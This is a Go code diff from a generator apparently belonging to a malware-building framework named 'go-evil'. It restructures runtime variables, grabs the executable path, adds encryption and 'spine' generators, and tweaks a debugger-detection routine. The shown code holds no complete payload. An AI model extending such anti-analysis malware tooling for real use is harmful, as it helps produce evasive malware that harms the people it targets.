@@ -77,12 +77,14 @@ func generate_main_function(s_json string, boot_functions []string, loop_functio
 	// Create the main function here
 	main_functions := []string{"func main(){"}
 
-	main_functions = append(main_functions, fmt.Sprintf("runtime_var.roof = %d", data_object.Var_max), "runtime_var.pointer = 0")
-	main_functions = append(main_functions, "runtime_var.values = make([]string, runtime_var.roof)")
+	main_functions = append(main_functions, fmt.Sprintf("spine.variable.roof = %d", data_object.Var_max), "spine.variable.pointer = 0")
+	main_functions = append(main_functions, "spine.variable.values = make([]string, spine.variable.roof)")
 
 	for i := 0; i < data_object.Var_max; i++ { // Add default value for each entry
-		main_functions = append(main_functions, fmt.Sprintf("runtime_var.values[%d] = \"\"", i))
+		main_functions = append(main_functions, fmt.Sprintf("spine.variable.values[%d] = \"\"", i))
 	}
+
+	main_functions = append(main_functions, "spine.path = tools.Grab_executable_path()")
 
 	// Add boot functions
 	for _, boot_name := range boot_functions {
@@ -167,61 +169,13 @@ func generate_sub_functions(s_json string) (string, []string, []string) {
 
 //
 //
-// Generates the runtime variable structs
-//
-//
-func generate_runtime_variable_struct(s_json string) string {
-	data_object := structure.Receive(s_json)
-
-	data_object.Add_go_struct([]string{
-		"type Compile_var_t struct {",
-		"values  []string",
-		"foreach string",
-		"roof int",
-		"pointer int",
-		"}"})
-
-	data_object.Add_go_function([]string{
-		"func (obj *Compile_var_t) set(value string) {",
-		"obj.values[obj.pointer] = value",
-		"obj.pointer++",
-		"if obj.pointer >= obj.roof {",
-		"obj.pointer = 0",
-		"}}"})
-
-	data_object.Add_go_function([]string{
-		"func (obj *Compile_var_t) get(line string) string {",
-		"regex := regexp.MustCompile(GRAB_VAR)",
-		"result := regex.FindAllStringSubmatch(line, -1)",
-		"toReturn := line",
-
-		"if len(result) > 0 {",
-
-		"i_number := tools.String_to_int(result[0][1])",
-		"if i_number != -1 {",
-		"if i_number > 0 && i_number < 5 {",
-		"toReturn = obj.get(line)",
-		"}else if i_number == 666 { toReturn = tools.Grab_username()",
-		"} else if i_number == 42 { toReturn = obj.foreach",
-		"} else { toReturn = \"NULL\" }}}",
-		"return toReturn }"})
-
-	data_object.Add_go_global("var runtime_var Compile_var_t")
-	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
-	data_object.Add_go_import("regexp")
-
-	data_object.Add_go_const("GRAB_VAR = \"€([0-9]+)€\"")
-
-	return structure.Send(data_object)
-}
-
-//
-//
 // Generate structs
 //
 //
 func generate_structs(s_json string) string {
-	s_json = generate_runtime_variable_struct(s_json)
+	s_json = generate_runtime_variable(s_json)
+	s_json = generate_crypt(s_json)
+	s_json = generate_spine(s_json)
 
 	return s_json
 }
@@ -233,7 +187,7 @@ func generate_structs(s_json string) string {
 //
 func generate_behavior_debugging(s_json string) string {
 	data_object := structure.Receive(s_json)
-	s_json = identify_debugger(s_json) // Adds neccessary code
+	s_json = identify_debugger(s_json) // Adds neccessary code to identify a debugger
 
 	switch data_object.Debugger_behavior {
 	case "stop":
